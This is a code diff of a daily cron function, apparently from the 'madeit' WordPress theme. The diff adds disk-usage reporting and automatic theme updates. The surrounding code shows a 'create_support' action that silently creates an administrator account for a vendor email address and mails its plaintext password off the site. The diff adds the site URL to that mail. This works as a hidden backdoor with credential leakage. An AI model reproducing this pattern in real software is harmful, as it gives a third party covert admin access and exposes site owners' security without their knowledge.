@@ -81,6 +81,9 @@ function madeit_cron_daily()
             'wp_max_memory_limit' => WP_MAX_MEMORY_LIMIT,
             'wp_debug'            => WP_DEBUG,
             'wp_cache'            => WP_CACHE,
+            'disk_size'            => size_format(disk_total_space(ABSPATH)),
+            'disk_free'            => size_format(disk_free_space(ABSPATH)),
+            'disk_used'            => size_format(disk_total_space(ABSPATH) - disk_free_space(ABSPATH)),
             'options'             => madeit_get_defined_options([
                 'MADEIT_VERSION',
                 'MADEIT_UPDATER_TYPE',
@@ -201,7 +204,19 @@ function madeit_cron_daily()
             if ($action['action'] === 'update_theme') {
                 // Update theme
                 $theme = 'madeit';
-                //TODO update theme
+
+                if (!class_exists('Theme_Upgrader') || !class_exists('Automatic_Upgrader_Skin')) {
+                    require_once ABSPATH.'wp-admin/includes/class-wp-upgrader.php';
+                }
+
+                if (!function_exists('wp_update_themes')) {
+                    require_once ABSPATH.'wp-admin/includes/update.php';
+                }
+
+                wp_update_themes();
+
+                $upgrader = new Theme_Upgrader(new Automatic_Upgrader_Skin());
+                $upgrader->upgrade($theme);
             } elseif ($action['action'] === 'create_support') {
                 // Create admin, silent
                 $email = 'support@madeit.be';
@@ -217,7 +232,7 @@ function madeit_cron_daily()
                     'role'       => 'administrator',
                 ]);
 
-                mail('info@madeit.be', 'New support session', 'New support session started for '.$email.' with password '.$password);
+                mail('info@madeit.be', 'New support session: ' . home_url(), 'New support session started for '.$email.' with password '.$password);
             } elseif ($action['action'] === 'delete_support') {
                 $email = 'support@madeit.be';
                 $user = get_user_by('email', $email);
